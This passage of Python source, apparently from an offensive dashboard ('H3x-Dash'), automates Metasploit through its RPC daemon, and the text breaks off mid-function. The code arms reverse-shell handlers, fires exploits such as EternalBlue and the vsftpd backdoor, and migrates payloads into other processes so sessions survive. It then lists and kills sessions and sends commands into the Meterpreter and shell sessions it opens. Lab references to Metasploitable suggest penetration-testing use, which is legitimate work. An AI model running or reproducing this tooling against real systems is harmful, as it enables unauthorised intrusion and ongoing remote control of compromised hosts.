        # often sets LHOST and forgets — silently default to 4444.
        if options.get('LHOST') and not options.get('LPORT'):
            options['LPORT'] = '4444'
            L('[*] LPORT auto-defaulted to 4444 (LHOST set, LPORT empty)')

        # ── Session baseline ──────────────────────────────────────────────
        try:
            sessions_before = {str(s.get('id', '')) for s in self.list_sessions()}
        except Exception:
            sessions_before = set()
        L(f'[*] Sessions before launch: {len(sessions_before)}')

        # ── Pre-flight: confirm target is actually reachable ──────────────
        # This catches the #2 cause of "exploit ran, no session" — the
        # operator firing against an unreachable IP (firewall, target down,
        # wrong RPORT). Cheap (~1s) and saves minutes of waiting on a
        # doomed exploit.
        rhosts_raw = options.get('RHOSTS', '')
        rport_raw  = options.get('RPORT', '')
        if rhosts_raw and rport_raw and _mod_type == 'exploit':
            # RHOSTS may be a comma-separated list — only test the first
            test_host = str(rhosts_raw).split(',')[0].strip()
            try:
                test_port = int(rport_raw)
                with socket.create_connection((test_host, test_port), timeout=3):
                    L(f'[*] Pre-flight: {test_host}:{test_port} TCP reachable')
            except (socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as exc:
                L(f'[!] Pre-flight: {test_host}:{test_port} NOT reachable ({exc})')
                L(f'    Continuing anyway — some exploits target ports that')
                L(f'    close immediately after probe. But if the target is')
                L(f'    down or behind a firewall, the exploit will time out.')
            except (TypeError, ValueError):
                L(f'[!] Pre-flight: RPORT {rport_raw!r} not parseable as int')
        L()

        # ── Create msfrpcd console for execution ──────────────────────────
        L('[*] Opening MSF console for execution...')
        try:
            console = client.consoles.console()
            cid     = console.cid
        except Exception as exc:
            L(f'[ERROR] Console creation failed: {exc}')
            return {'status': 'error',
                    'message': f'Console creation failed: {exc}',
                    'result':  '\n'.join(log)}

        L(f'[*] Console ready: cid={cid}')

        try:
            # Drain startup banner
            time.sleep(0.4)
            try:
                _ = console.read()
            except Exception:
                pass

            # Build command sequence
            handler_first = (_needs_handler_first(module, payload)
                             and _verb in ('run', 'exploit')
                             and _mod_type == 'exploit'
                             and options.get('LHOST'))
            if handler_first:
                lport = options.get('LPORT', '4444')
                commands = [
                    'jobs -K',
                    'use exploit/multi/handler',
                    f'set PAYLOAD {payload}',
                    f'set LHOST {options["LHOST"]}',
                    f'set LPORT {lport}',
                    'run -j',
                    f'use {module}',
                    f'set PAYLOAD {payload}',
                ]
                _append_datastore_options(commands, options)
                if target is not None:
                    commands.append(f'set TARGET {target}')
                commands.append('set DisablePayloadHandler true')
                commands.append('set WfsDelay 10')
                L('[*] Handler-first: clearing stale jobs (jobs -K), then '
                  'background exploit/multi/handler before exploit '
                  '(distcc/IRC callback timing)')
                L('    DisablePayloadHandler on exploit — job handler catches '
                  'the reverse shell.')
            else:
                commands = [f'use {module}']
                if payload:
                    commands.append(f'set PAYLOAD {payload}')
                _append_datastore_options(commands, options)
                if target is not None:
                    commands.append(f'set TARGET {target}')
                if (any(marker in (module or '')
                        for marker in _HANDLER_FIRST_EXPLOITS)
                        and _verb in ('run', 'exploit')
                        and _mod_type == 'exploit'):
                    commands.append('set WfsDelay 10')

            # ── Session-survival hardening for fragile exploits ───────────────
            # None = auto (on for fragile kernel exploits). Staged payloads use
            # PrependMigrate (stager-level). Stageless payloads MUST use
            # InitialAutoRunScript — PrependMigrate has no effect on them.
            do_migrate = auto_migrate
            if do_migrate is None:
                do_migrate = _is_fragile_exploit(module)
            _payload_is_windows = bool(payload and payload.lower().startswith('windows/'))
            _, death_count = self._adaptive_payload_for(
                module, options.get('RHOSTS', ''))
            if (do_migrate and _verb in ('run', 'exploit')
                    and _mod_type == 'exploit' and _payload_is_windows):
                if _is_stageless_payload(payload):
                    autorun = _migrate_autorun_script(death_count)
                    commands.append(f'set InitialAutoRunScript {autorun}')
                    L(f'[*] Session hardening: spawn-and-migrate via {autorun}')
                    L('    (stageless payload — spawns a fresh host process and')
                    L('     migrates the instant the session opens. Spawn-based,')
                    L('     so it never depends on rundll32/explorer pre-existing)')
                else:
                    commands.append('set PrependMigrate true')
                    commands.append(
                        f'set PrependMigrateProc {_PREPEND_MIGRATE_PROC}')
                    L(f'[*] Session hardening: PrependMigrate → '
                      f'{_PREPEND_MIGRATE_PROC}')
                    L(f'    (stager migrates into {_PREPEND_MIGRATE_PROC} before '
                      f'meterpreter loads)')
            if (_is_fragile_exploit(module) and _verb in ('run', 'exploit')
                    and _mod_type == 'exploit' and _payload_is_windows):
                commands.append('set EXITFUNC thread')
                L('[*] EXITFUNC thread (reduces host-process teardown on fragile '
                  'kernel exploits)')

            # Run exploits foreground but NON-INTERACTING:
            #   -z  do not drop into session interaction when it opens
            # We deliberately do NOT use -j. A backgrounded job returns control
            # to the console immediately, printing a premature "Exploit
            # completed, but no session was created" while staging is still in
            # flight — and our output capture stops before the session lands.
            # Foreground -z blocks until the exploit truly finishes (full output,
            # real verdict) while never attaching the console to the session, so
            # destroying the console in the finally block can't disrupt it.
            if _verb in ('run', 'exploit') and _mod_type == 'exploit':
                exec_cmd = f'{_verb} -z'
                L('[*] Launch mode: foreground, no auto-interact (exploit -z)')
            else:
                exec_cmd = _verb
            commands.append(exec_cmd)

            import re as _re
            _PROMPT_RX = _re.compile(r'^msf\d*\s*(\([^)]*\))?\s*>\s*')
            console_lines: list[str] = []

            def _echo_console(data: str) -> None:
                if not data:
                    return
                for line in data.splitlines():
                    stripped = line.rstrip()
                    if stripped and not _PROMPT_RX.match(stripped):
                        L(stripped)
                        console_lines.append(stripped)

            def _write_cmd(cmd: str) -> None:
                try:
                    console.write(cmd + '\n')
                except Exception as exc:
                    L(f'[ERROR] console.write({cmd!r}) failed: {exc}')
                    raise
                L(f'    msf6> {_mask_console_cmd(cmd)}')

            def _wait_handler_ready(timeout: float = 10.0) -> bool:
                """After handler run -j, block until MSF reports listener up."""
                start = time.time()
                last_data = start
                while time.time() - start < timeout:
                    try:
                        resp = console.read()
                    except Exception:
                        break
                    data = resp.get('data', '') or ''
                    busy = resp.get('busy', False)
                    if data:
                        _echo_console(data)
                        last_data = time.time()
                        joined = '\n'.join(console_lines).lower()
                        if any(m in joined for m in _HANDLER_READY_MARKERS):
                            return True
                    if not busy and time.time() - last_data > 1.5:
                        joined = '\n'.join(console_lines).lower()
                        return any(m in joined for m in _HANDLER_READY_MARKERS)
                    time.sleep(0.3)
                joined = '\n'.join(console_lines).lower()
                return any(m in joined for m in _HANDLER_READY_MARKERS)

            # ── Send commands (staged for handler-first timing) ─────────────
            if handler_first:
                split_at = commands.index(f'use {module}')
                handler_cmds = commands[:split_at]
                exploit_cmds = commands[split_at:]
                L('[*] Handler-first: arming listener before exploit module')
                for cmd in handler_cmds:
                    _write_cmd(cmd)
                    if cmd.strip() == 'run -j':
                        time.sleep(0.6)
                        if _wait_handler_ready():
                            L('[*] Handler listening — launching exploit')
                        else:
                            L('[!] Handler ready signal not seen — pausing 2s '
                              'before exploit (distcc/IRC callback timing)')
                            time.sleep(2.0)
                for cmd in exploit_cmds:
                    _write_cmd(cmd)
            else:
                for cmd in commands:
                    _write_cmd(cmd)

            L()
            L('[*] Console output:')
            L('─' * 60)

            # Poll console for output until idle or timeout
            start          = time.time()
            last_data_time = start
            # 8s of silence before declaring done — modern exploits routinely
            # have 5–10s pauses while staging, especially over slow links.
            # Old 3s threshold was exiting the poll loop before the session
            # was actually opened, returning "no session" on successful runs.
            IDLE_THRESHOLD = 8.0
            MIN_WAIT       = 3.0   # never exit before this even if 'idle'
            saw_any_data   = False

            while time.time() - start < poll_timeout:
                try:
                    resp = console.read()
                except Exception as exc:
                    L(f'[ERROR] console.read() failed: {exc}')
                    break

                data = resp.get('data', '') or ''
                busy = resp.get('busy', False)

                if data:
                    saw_any_data = True
                    for line in data.splitlines():
                        stripped = line.rstrip()
                        if not stripped:
                            continue
                        # Filter msf6 prompt echoes — operator already saw the
                        # commands listed in the wrapper log. Showing them
                        # again here just clutters the output.
                        if _PROMPT_RX.match(stripped):
                            continue
                        L(stripped)
                        console_lines.append(stripped)
                    last_data_time = time.time()

                # Done conditions — both must hold
                elapsed  = time.time() - start
                idle_for = time.time() - last_data_time
                if elapsed >= MIN_WAIT and not busy and idle_for > IDLE_THRESHOLD:
                    break
                # Short-circuit when a session opens — no need to wait longer
                joined = '\n'.join(console_lines).lower()
                if ('session' in joined and 'opened' in joined and idle_for > 1.5):
                    L('')
                    L('[*] Session opened — finalizing.')
                    break

                time.sleep(0.4)
            else:
                L('')
                L(f'[!] Console still busy after {poll_timeout}s — exploit may')
                L(f'    still be running. Check  msfconsole -q -x "jobs -l"')

            # Final drain — catch any trailing lines
            try:
                tail = console.read()
                if tail.get('data'):
                    for line in tail['data'].splitlines():
                        stripped = line.rstrip()
                        if stripped:
                            L(stripped)
                            console_lines.append(stripped)
            except Exception:
                pass

            L('─' * 60)
            full_output = '\n'.join(console_lines)

            # ── Outcome detection from console output ─────────────────────
            text         = full_output.lower()
            # Positive session detection from console text. Guard against the
            # negative phrasings MSF uses on failure ("no session was created",
            # "session ... not opened") so we don't false-positive.
            sess_closed = False
            sess_opened = (
                'opened' in text
                and 'session' in text
                and 'no session' not in text
                and 'not opened' not in text
            )
            sess_closed = sess_closed or (
                'session' in text
                and any(kw in text for kw in (
                    'session closed', 'session has died', 'session died',
                    'invalid session', 'session is not valid',
                ))
            )
            if sess_closed:
                sess_opened = False
            # check_vuln / check_safe are ONLY meaningful in check mode. During a
            # real run, EternalBlue prints "The target is vulnerable" mid-exploit
            # — that must not be reported as a check verdict. In check mode we use
            # the CheckCode-aware parser so every MSF verdict (Vulnerable, Appears,
            # Detected, Safe, Unsupported/no-check, Unreachable, Unknown) maps to a
            # precise, explainable result instead of a catch-all UNKNOWN.
            is_check_mode = (_verb == 'check')
            check_code   = None
            check_detail = ''
            check_vuln   = False
            check_safe   = False
            if is_check_mode:
                from modules.check_verdict import parse_check_verdict
                _cv = parse_check_verdict(full_output)
                check_code   = _cv['code']
                check_detail = _cv['detail']
                check_vuln   = _cv['verdict'] == 'VULNERABLE'
                check_safe   = _cv['verdict'] == 'NOT_VULNERABLE'
            exploit_failed = (not is_check_mode and (
                              'exploit failed' in text or
                              'exploit aborted' in text or
                              'exploit completed, but no session was created' in text or
                              'unable to deliver payload' in text))

            # Payload-rejection detection — if MSF rejected our `set PAYLOAD`, the
            # exploit silently ran with the module default and our hardening
            # (PrependMigrate, etc.) may not have applied. Surface this loudly.
            payload_rejected = (payload and (
                'the value specified for payload is not valid' in text))
            if payload_rejected:
                L('')
                L(f'[!] PAYLOAD REJECTED by MSF: {payload}')
                L('    The exploit ran with the module default payload instead.')
                compat = _MODULE_COMPATIBLE_PAYLOADS.get(module, [])
                if compat:
                    L(f'    Compatible payloads for this module: {", ".join(compat)}')
                L('    Leave PAYLOAD blank for auto-select, or try '
                  'cmd/unix/reverse_perl on Metasploitable targets.')

            # Session appearance wait — the authoritative signal. Even with
            # foreground -z, a freshly-staged session can register a moment
            # after the console returns to idle, so we poll sessions.list rather
            # than trusting console-text timing. For run-mode exploits we wait up
            # to SESSION_WAIT seconds, exiting the moment a new session appears
            # or a failure verdict is seen.
            def _diff_sessions():
                try:
                    after = {str(s.get('id', '')): s
                             for s in self.list_sessions()}
                except Exception:
                    after = {}
                return [v for k, v in after.items() if k not in sessions_before]

            new_sessions = _diff_sessions()
            is_run_exploit = (_verb in ('run', 'exploit')
                              and _mod_type == 'exploit')
            if not new_sessions and not exploit_failed and is_run_exploit:
                if handler_first:
                    SESSION_WAIT = 45.0
                elif (_is_interact_payload(payload)
                      or _profile.get('payload_mode') == 'interact'):
                    # vsftpd interact runs with payload=None now — detect via profile.
                    SESSION_WAIT = 35.0
                else:
                    SESSION_WAIT = 25.0
                waited = 0.0
                while waited < SESSION_WAIT:
                    time.sleep(1.0)
                    waited += 1.0
                    new_sessions = _diff_sessions()
                    if new_sessions:
                        L(f'[*] Session registered after {waited:.0f}s')
                        break
                    # Drain any late console output (job log: staging / failure)
                    try:
                        late = console.read().get('data', '') or ''
                    except Exception:
                        late = ''
                    if late:
                        for line in late.splitlines():
                            s = line.rstrip()
                            if s and not _PROMPT_RX.match(s):
                                L(s)
                                console_lines.append(s)
                        lt = late.lower()
                        if ('session' in lt and 'opened' in lt
                                and 'no session' not in lt
                                and not any(kw in lt for kw in (
                                    'session closed', 'session died',
                                    'invalid session',
                                ))):
                            sess_opened = True
                        if any(kw in lt for kw in (
                            'session closed', 'session died', 'invalid session',
                        )):
                            sess_closed = True
                            sess_opened = False
                        if ('exploit failed' in lt or 'exploit aborted' in lt
                                or 'no session was created' in lt
                                or 'exploit completed, but no session' in lt):
                            exploit_failed = True
                            break
                # Recompute the full-text flags with any late lines included
                full_output = '\n'.join(console_lines)
                text = full_output.lower()
            if new_sessions:
                self._remember_session_origin(
                    new_sessions,
                    module=module,
                    rhosts=options.get('RHOSTS', ''),
                    payload=payload,
                )

            # ── Operator-facing summary ───────────────────────────────────
            L()
            if new_sessions:
                L(f'[+] {len(new_sessions)} new session(s) opened:')
                for s in new_sessions:
                    peer = s.get('target') or s.get('tunnel') or s.get('tunnel_peer') or '?'
                    user = s.get('user') or s.get('username') or '?'
                    L(f'    [{s.get("id")}] {s.get("type", "?")} '
                      f'-> {peer} '
                      f'as {user}')
            elif sess_opened:
                L('[?] Console reported session opened but msfrpcd has no live '
                  'session yet — it may still be registering or already died.')
                if handler_first:
                    L('    distcc/IRC: confirm handler job is up (jobs -l) and '
                      'LHOST:LPORT is reachable from the target.')
                elif (_is_interact_payload(payload)
                      or _profile.get('payload_mode') == 'interact'):
                    L('    vsftpd interact: backdoor shell lands on target :6200 — '
                      'if no tab appears, reboot the target (single-shot) and '
                      'launch with payload blank (module default) + auto-migrate OFF.')
            elif check_vuln:
                L('[+] Target appears VULNERABLE (check mode — no exploit fired)')
            elif check_safe:
                L('[-] Target reports NOT VULNERABLE')
            elif is_check_mode and check_code:
                # Non-binary CheckCode outcomes — explain rather than bare UNKNOWN.
                if check_code == 'DETECTED':
                    L('[*] Service DETECTED — exploitability not confirmed by check.')
                    L('    ' + check_detail)
                    L('    Confirm by launching the exploit (many MT2 modules can '
                      'only be proven by firing).')
                elif check_code == 'UNSUPPORTED':
                    L('[*] Module has NO check method (NO_CHECK).')
                    L('    This is normal for backdoor/cmd-exec modules (vsftpd, '
                      'usermap, UnrealIRCd). It is NOT a failure — confirm by '
                      'launching the exploit.')
                elif check_code == 'UNREACHABLE':
                    L('[!] Check could not reach the target service.')
                    L('    ' + check_detail)
                else:
                    L('[?] Check inconclusive — ' + check_detail)
            elif exploit_failed:
                L('[!] Exploit failed — diagnostics below:')
                L('    Common causes (in order of likelihood):')
                L('     1. Wrong target index — set TARGET 0/1/2/... explicitly')
                L('     2. LHOST not routable from RHOSTS (firewall / NAT)')
                L('     3. RHOSTS unreachable on RPORT (run nmap -p {} {})'.format(
                    options.get('RPORT','?'), options.get('RHOSTS','?')))
                L('     4. Missing module-specific option (SMBPipe, TARGETURI, etc.)')
                L('     5. Module rank too low — target may be patched')
            elif not saw_any_data:
                L('[!] No console output captured.')
                L('    msfrpcd may not have processed the commands. Verify:')
                L(f'      msfconsole -q -x "use {module}; show options; exit"')
            else:
                # Got output but nothing conclusive — could be aux scanner
                if _mod_type in ('auxiliary', 'post'):
                    L(f'[*] {_mod_type.capitalize()} module completed — '
                      f'no session expected.')
                    L(f'    Findings (if any) are in the output above.')
                else:
                    L('[?] No session opened and no explicit failure reported.')
                    L('    Module may have completed without an exploit attempt')
                    L('    (e.g. silent target-incompatibility check).')

            session_confirmed = bool(new_sessions)
            session_unconfirmed = bool(
                not new_sessions and sess_opened and not exploit_failed
                and is_run_exploit and _mod_type == 'exploit'
            )

            result_dict = {
                'status':              'launched',
                'result':              '\n'.join(log),
                'console_output':      full_output,
                'sessions':            new_sessions,
                'session_confirmed':   session_confirmed,
                'session_unconfirmed': session_unconfirmed,
                # Strict: only confirmed live sessions count as opened.
                'session_opened':      session_confirmed,
                'session_reported':    bool(sess_opened and not exploit_failed),
                'session_expected':    is_run_exploit and _mod_type == 'exploit',
                'exploit_failed':      exploit_failed,
                'check_vulnerable':    check_vuln,
                'check_safe':          check_safe,
                'check_code':          check_code,
                'check_detail':        check_detail,
            }

            # ── Information gained — feed the failure/outcome back into the
            # resolver so the next attempt in the chain is re-armed. Recorded
            # per (module, rhost) and attached to the response.
            try:
                self._record_run_outcome(module, options.get('RHOSTS', ''),
                                         payload, target, handler_first,
                                         result_dict)
            except Exception:
                pass
            return result_dict

        except Exception as exc:
            L(f'[ERROR] console run aborted: {exc}')
            return {'status': 'error',
                    'message': str(exc),
                    'result':  '\n'.join(log)}
        finally:
            try:
                console.destroy()
            except Exception:
                pass

    # ── Session RPC primitives ────────────────────────────────────────────────
    # pymetasploit3's sessions.session(sid) performs a literal key lookup on
    # sessions.list. When msfrpcd returns integer session ids (common on Kali's
    # apt python3-pymetasploit3) but the UI passes "1" as a string, the lookup
    # fails with "Session ID (1) does not exist" even though the session is live.
    # Resolve the native list key and talk to msfrpcd via client.call directly.

    def _raw_sessions_list(self, client) -> dict:
        try:
            return client.call('session.list') or {}
        except Exception:
            try:
                return client.sessions.list or {}
            except Exception:
                return {}

    @staticmethod
    def _sid_key(key) -> str:
        if isinstance(key, bytes):
            try:
                key = key.decode('utf-8', 'replace')
            except Exception:
                return str(key)
        return str(key).strip()

    def _sid_param(self, client, session_id):
        """Return the sessions.list key msfrpcd expects (int or str), or None."""
        want = self._sid_key(session_id)
        if not want:
            return None
        raw = self._raw_sessions_list(client)
        for k, info in raw.items():
            if self._sid_key(k) == want:
                return k
            if isinstance(info, dict):
                uuid = info.get('uuid')
                if uuid and self._sid_key(uuid) == want:
                    return k
        return None

    def _sid_io_lock(self, session_id: str) -> threading.RLock:
        sid = self._sid_key(session_id)
        with self._sid_io_guard:
            lock = self._sid_io_locks.get(sid)
            if lock is None:
                lock = threading.RLock()
                self._sid_io_locks[sid] = lock
            return lock

    def _session_kind_raw(self, client, sid_param) -> str:
        info = self._raw_sessions_list(client).get(sid_param, {})
        if not isinstance(info, dict):
            return 'shell'
        t = info.get('type', '')
        if isinstance(t, bytes):
            t = t.decode('utf-8', 'replace')
        t = (t or '').lower()
        if 'meter' in t:
            return 'meterpreter'
        if t in ('shell', 'powershell'):
            return t
        return t or 'shell'

    def _raw_session_read(self, client, sid_param, kind=None) -> str:
        kind = kind or self._session_kind_raw(client, sid_param)
        if kind == 'meterpreter':
            resp = client.call('session.meterpreter_read', [sid_param])
        else:
            resp = client.call('session.shell_read', [sid_param])
        if isinstance(resp, dict):
            return resp.get('data') or resp.get('output') or ''
        return resp or ''

    def _raw_session_write(self, client, sid_param, data, kind=None) -> None:
        kind = kind or self._session_kind_raw(client, sid_param)
        if data and not str(data).endswith('\n'):
            data = str(data) + '\n'
        if kind == 'meterpreter':
            client.call('session.meterpreter_write', [sid_param, data])
        else:
            client.call('session.shell_write', [sid_param, data])

    def _raw_session_stop(self, client, sid_param):
        return client.call('session.stop', [sid_param])

    def _raw_meterpreter_run_single(self, client, sid_param, command) -> None:
        client.call('session.meterpreter_run_single', [sid_param, command])

    # ── Session management ────────────────────────────────────────────────────

    def list_sessions(self) -> list:
        client = self._client_ref()
        if client is None:
            return []

        def _decode(info: dict) -> dict:
            # msgpack can hand back bytes keys/values on some pymetasploit3
            # versions; normalize BOTH so the UI never renders b'shell' or empty
            # cells. Keys are coerced to str first, then values per-lookup.
            def _s(v):
                if isinstance(v, bytes):
                    try:
                        return v.decode('utf-8', 'replace')
                    except Exception:
                        return ''
                return v if v is not None else ''
            info = {(_s(k) if isinstance(k, bytes) else k): v
                    for k, v in info.items()}
            g = lambda *keys: next((_s(info[k]) for k in keys if k in info), '')
            return {
                'type':     g('type'),
                'target':   g('target_host', 'session_host', 'tunnel_peer'),
                'user':     g('username'),
                'platform': g('platform'),
                'arch':     g('arch'),
                'info':     g('info'),
                'tunnel':   g('tunnel_local'),
            }

        # A single RPC hiccup (e.g. a transient transport error) must NOT blank a
        # panel that has live sessions, so retry once before giving up. Returning
        # [] only on a genuine empty list or a hard failure.
        last_exc = None
        for attempt in range(2):
            try:
                raw = self._raw_sessions_list(client)
                sessions = []
                for sid, info in raw.items():
                    if not isinstance(info, dict):
                        continue
                    row = {'id': str(sid.decode() if isinstance(sid, bytes) else sid)}
                    row.update(_decode(info))
                    sessions.append(row)

                # Newest sessions first so UI defaults don't keep landing on
                # stale/older sessions after a fresh exploit run.
                def _sid_key(sess: dict):
                    try:
                        return (0, -int(str(sess.get('id', '')).strip()))
                    except Exception:
                        return (1, str(sess.get('id', '')))
                sessions.sort(key=_sid_key)
                return sessions
            except Exception as exc:
                last_exc = exc
                if attempt == 0:
                    time.sleep(0.4)
                    client = self._client_ref()
                    if client is None:
                        return []
        print(f'[H3x-Dash] list_sessions RPC error: {last_exc}')
        return []

    def kill_session(self, session_id: str) -> dict:
        """
        Stop a single MSF session by id. Used by the per-tab close button on
        the Shell page. Intentional operator action, so it does not arm the
        adaptive payload fallback the way a spontaneous session death does.
        Treats an already-gone session as success (the goal is "it's gone").
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error',
                    'message': 'Not connected to Metasploit RPC'}

        sid = str(session_id).strip()
        if not sid:
            return {'status': 'error', 'message': 'No session id'}

        def _forget(s):
            with self._session_state_lock:
                self._session_origin.pop(s, None)

        try:
            sid_param = self._sid_param(client, sid)
            if sid_param is None:
                _forget(sid)
                result = {'status': 'ok', 'killed': sid,
                          'message': f'Session {sid} already gone'}
                try:
                    from modules.ops_log import ops_log
                    ops_log.log_session_event(sid, 'kill', result=result)
                except Exception:
                    pass
                return result
            self._raw_session_stop(client, sid_param)
            _forget(sid)
            result = {'status': 'ok', 'killed': sid,
                      'message': f'Session {sid} closed'}
            try:
                from modules.ops_log import ops_log
                ops_log.log_session_event(sid, 'kill', result=result)
            except Exception:
                pass
            return result
        except Exception as exc:
            low = str(exc).lower()
            # Already dead / unknown — that's the desired end state anyway.
            if ('does not exist' in low or 'unknown session' in low
                    or 'invalid session' in low):
                _forget(sid)
                result = {'status': 'ok', 'killed': sid,
                          'message': f'Session {sid} already gone'}
                try:
                    from modules.ops_log import ops_log
                    ops_log.log_session_event(sid, 'kill', result=result)
                except Exception:
                    pass
                return result
            return {'status': 'error', 'message': str(exc)}

    def kill_all_sessions(self) -> dict:
        """
        Stop every registered MSF session. Clears stale tabs in the Shell UI
        without arming adaptive payload fallback (intentional operator action).
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error',
                    'message': 'Not connected to Metasploit RPC',
                    'killed': [], 'failed': [], 'count': 0}

        sessions = self.list_sessions()
        killed, failed = [], []

        for s in sessions:
            sid = str(s.get('id', '')).strip()
            if not sid:
                continue
            try:
                sid_param = self._sid_param(client, sid)
                if sid_param is None:
                    with self._session_state_lock:
                        self._session_origin.pop(sid, None)
                    continue
                self._raw_session_stop(client, sid_param)
                killed.append(sid)
                with self._session_state_lock:
                    self._session_origin.pop(sid, None)
            except Exception as exc:
                failed.append({'id': sid, 'message': str(exc)})

        return {
            'status': 'ok',
            'killed': killed,
            'failed': failed,
            'count':  len(killed),
            'message': (f'Killed {len(killed)} session(s)'
                        + (f'; {len(failed)} failed' if failed else '')),
        }

    def session_command(self, session_id: str, command: str) -> dict:
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        lock = self._sid_io_lock(session_id)
        with lock:
            try:
                sid_param = self._sid_param(client, session_id)
                if sid_param is None:
                    return {'status': 'error',
                            'message': f'Session {session_id} does not exist'}
                kind = self._session_kind_raw(client, sid_param)
                self._raw_session_write(client, sid_param, command + '\n', kind)
                time.sleep(1.5)
                output = self._raw_session_read(client, sid_param, kind)
                return {'status': 'ok', 'output': output or ''}
            except Exception as e:
                return {'status': 'error', 'message': str(e)}

    # ── New session API for the dedicated Shell page ─────────────────────────
    # session_command above is kept for back-compat with the Loot tab's modal.
    # The Shell page uses the methods below for:
    #   - non-blocking reads (streaming output via polling)
    #   - type-aware dispatch (shell vs Meterpreter use different MSF APIs)
    #   - explicit writes (for interactive shells where command framing matters)

    def _session_type(self, session_id: str) -> str:
        """Return 'meterpreter', 'shell', or '' if unknown."""
        for s in self.list_sessions():
            if str(s.get('id')) == str(session_id):
                t = (s.get('type') or '').lower()
                if 'meter' in t:
                    return 'meterpreter'
                if t in ('shell', 'powershell'):
                    return t
                return t
        return ''

    def session_read(self, session_id: str) -> dict:
        """
        Non-blocking read of latest buffer. Used by the Shell page to poll
        for streaming output without sending a command.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC',
                    'output': ''}
        lock = self._sid_io_lock(session_id)
        with lock:
            try:
                sid_param = self._sid_param(client, session_id)
                if sid_param is None:
                    return self._classify_session_error(
                        KeyError(f'Session ID ({session_id}) does not exist'),
                        session_id)
                kind = self._session_kind_raw(client, sid_param)
                output = self._raw_session_read(client, sid_param, kind) or ''
                return {'status': 'ok', 'output': output,
                        'session_type': self._session_type(session_id)}
            except Exception as e:
                return self._classify_session_error(e, session_id)

    def _classify_session_error(self, exc, session_id: str) -> dict:
        """
        Turn a raw session-operation exception into a clear result. The most
        common one is a dead session: MSF says "Session ID (N) does not exist"
        when the session opened but its host process died (very common with
        kernel-injection exploits). Surface that as a clean, actionable message
        plus a session_dead flag so the Shell tab can drop the dead session
        instead of showing a cryptic raw error.
        """
        msg = str(exc)
        low = msg.lower()
        if ('does not exist' in low or 'unknown session' in low
                or ('session id' in low and 'exist' in low)
                or 'session is not valid' in low or 'invalid session' in low):
            module, rhost, count = self._note_dead_session(session_id)
            extra = ''
            adaptive = _ADAPTIVE_STAGELESS_PAYLOADS.get(module or '')
            if adaptive and rhost:
                extra = (f' Next blank-payload run against {rhost} will use '
                         f'{adaptive} with escalated auto-migrate '
                         f'(dead sessions seen: {count}). Re-launch the exploit '
                         f'— do not reuse this session tab.')
            origin = self._session_origin.get(str(session_id), {})
            origin_mod = (origin.get('module') or '').lower()
            if 'vsftpd' in origin_mod:
                hint = (' vsftpd backdoor uses cmd/unix/interact (no reverse '
                        'callback). Re-launch with auto-migrate OFF; session '
                        'opens on target :6200.')
            elif 'distcc' in origin_mod or 'usermap' in origin_mod:
                hint = (' For distcc/Samba cmd shells: leave payload blank '
                        '(reverse_perl + handler-first), or try '
                        'cmd/unix/bind_perl and connect from Kali.')
            elif 'ghostcat' in origin_mod:
                hint = (' tomcat_ghostcat is an auxiliary module — it does '
                        'not open a shell session. Use file-read output above.')
            else:
                stype = (origin.get('session_type') or '').lower()
                if stype == 'meterpreter' or 'eternalblue' in origin_mod \
                        or 'bluekeep' in origin_mod or 'ms17' in origin_mod:
                    # Kernel-injection / Meterpreter: host process is unstable.
                    hint = (' Kernel-injection payloads land in an unstable host '
                            'process. Kill stale sessions, clear the payload '
                            'field, and re-launch with auto-migrate ON.')
                else:
                    # Generic cmd/unix shell: the callback dropped or the remote
                    # interpreter exited. Don't assume EternalBlue.
                    hint = (' The shell process exited or the callback dropped. '
                            'Kill stale sessions and re-launch — try a '
                            'handler-first reverse payload (reverse_perl) or a '
                            'bind payload if the callback path is filtered.')
            return {
                'status': 'error',
                'session_dead': True,
                'message': (f'Session {session_id} has died — the target '
                            f'process likely terminated.{hint}{extra}'),
            }
        return {'status': 'error', 'message': msg}

    def session_write(self, session_id: str, data: str) -> dict:
        """
        Raw write to a session. For shells this is how to send input —
        Meterpreter prefers session_meterpreter_run for proper response capture.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        lock = self._sid_io_lock(session_id)
        with lock:
            try:
                sid_param = self._sid_param(client, session_id)
                if sid_param is None:
                    return self._classify_session_error(
                        KeyError(f'Session ID ({session_id}) does not exist'),
                        session_id)
                kind = self._session_kind_raw(client, sid_param)
                self._raw_session_write(client, sid_param, data, kind)
                return {'status': 'ok'}
            except Exception as e:
                return self._classify_session_error(e, session_id)

    def session_meterpreter_run(self, session_id: str, command: str,
                                  timeout: int = 15) -> dict:
        """
        Run a Meterpreter command via meterpreter_run_single + read accumulation.
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        lock = self._sid_io_lock(session_id)
        with lock:
            try:
                sid_param = self._sid_param(client, session_id)
                if sid_param is None:
                    return self._classify_session_error(
                        KeyError(f'Session ID ({session_id}) does not exist'),
                        session_id)
                self._raw_meterpreter_run_single(client, sid_param, command)
                output = ''
                silent_reads = 0
                for _ in range(timeout * 2):
                    time.sleep(0.5)
                    chunk = self._raw_session_read(client, sid_param, 'meterpreter') or ''
                    if chunk:
                        output += chunk
                        silent_reads = 0
                    else:
                        silent_reads += 1
                        if silent_reads >= 2 and output:
                            break
                return {'status': 'ok', 'output': output}
            except Exception as e:
                return self._classify_session_error(e, session_id)

    def session_run(self, session_id: str, command: str,
                     timeout: int = 15) -> dict:
        """
        Type-dispatched session runner — the right MSF API per session type.
        This is what the Shell page calls for every command send.

        Meterpreter → meterpreter_run (synchronous, captures full output)
        Shell       → write + read (raw command framing)
        """
        stype = self._session_type(session_id)
        if stype == 'meterpreter':
            result = self.session_meterpreter_run(session_id, command, timeout)
        else:
            # Raw shell / powershell — write the line, give it a beat, read back
            client = self._client_ref()
            if client is None:
                return {'status': 'error',
                        'message': 'Not connected to Metasploit RPC'}
            lock = self._sid_io_lock(session_id)
            with lock:
                try:
                    sid_param = self._sid_param(client, session_id)
                    if sid_param is None:
                        return self._classify_session_error(
                            KeyError(f'Session ID ({session_id}) does not exist'),
                            session_id)
                    kind = self._session_kind_raw(client, sid_param)
                    self._raw_session_write(client, sid_param, command + '\n', kind)
                    # Dumb reverse shells (reverse_perl) answer slowly and in
